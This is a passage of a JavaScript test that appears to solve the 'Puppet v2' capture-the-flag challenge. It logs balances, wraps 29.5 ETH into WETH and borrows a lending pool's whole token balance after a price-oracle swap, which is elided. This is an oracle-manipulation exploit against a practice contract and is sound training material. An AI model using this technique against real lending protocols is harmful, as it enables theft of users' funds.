...
describe('[Challenge] Puppet v2', function () {
  ...
  it('Execution', async function () {
    ...
    //1. player ETH balance before swap
    const playerEthBalanceBefore = await ethers.provider.getBalance(
      player.address
    );
    console.log(
      `player ETH balance before swap: ${ethers.utils.formatEther(
        playerEthBalanceBefore
      )}`
    );
    // approve uniswapRouter to spend player token
    ...
    //2. player ETH balance after swap
    const playerEthBalanceAfter = await ethers.provider.getBalance(
      player.address
    );
    console.log(
      `player ETH balance after swap: ${ethers.utils.formatEther(
        playerEthBalanceAfter
      )}`
    );
    // 3. player WETH balance after swap
    const playerWethBalanceAfter = await weth.balanceOf(player.address);
    console.log(
      `player WETH balance after swap: ${ethers.utils.formatEther(
        playerWethBalanceAfter
      )}`
    );

    //3. token balance of lendingPool
    const tokenBalanceOfLendingPool = await token.balanceOf(
      lendingPool.address
    );
    console.log(
      `token balance of lendingPool: ${ethers.utils.formatEther(
        tokenBalanceOfLendingPool
      )}`
    );

    // 4. calculateDepositOfWETHRequired
    const wethRequired = await lendingPool.calculateDepositOfWETHRequired(
      tokenBalanceOfLendingPool
    );
    console.log(`wethRequired: ${ethers.utils.formatEther(wethRequired)}`);


    const deposit_amount = ethers.utils.parseEther('29.5');

    // deposit 29.5 ETH to get WETH
    // convert ETH to WETH
    await weth.connect(player).deposit({value: deposit_amount});
    await weth.connect(player).approve(lendingPool.address, deposit_amount);
  
    await lendingPool.connect(player).borrow(tokenBalanceOfLendingPool);
